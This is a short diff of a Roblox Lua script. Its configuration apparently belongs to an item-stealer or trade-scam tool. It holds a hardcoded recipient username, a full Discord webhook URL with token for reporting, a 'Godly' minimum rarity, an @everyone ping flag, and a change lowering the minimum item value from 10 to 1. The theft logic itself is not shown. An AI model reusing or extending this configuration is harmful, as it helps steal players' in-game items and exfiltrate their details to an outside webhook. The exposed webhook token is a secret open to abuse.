@@ -19,7 +19,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HARDCODED_USERS = {"JAMAL_THESCRIPTGUY"}
 local webhook = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 local min_rarity = "Godly"
-local min_value = 10
+local min_value = 1
 local pingEveryone = true
 
 -- Build users list
